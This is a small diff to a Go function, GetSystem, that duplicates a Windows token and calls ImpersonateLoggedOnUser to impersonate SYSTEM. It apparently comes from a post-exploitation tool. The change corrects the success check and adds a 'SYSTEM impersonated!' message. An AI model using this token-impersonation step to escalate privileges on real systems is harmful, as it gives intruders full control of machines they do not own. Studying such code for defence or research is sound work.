@@ -123,7 +123,8 @@ func GetSystem() {
 			fmt.Printf("dupe_group: %v\n", dupe_group)
 
 			ret, _, err := dll.ImpersonateLoggedOnUser.Call(uintptr(duplicateToken))
-			if ret == 0 {
+			if ret != 0 {
+				fmt.Printf("SYSTEM impersonated!")
 				return
 			}
 
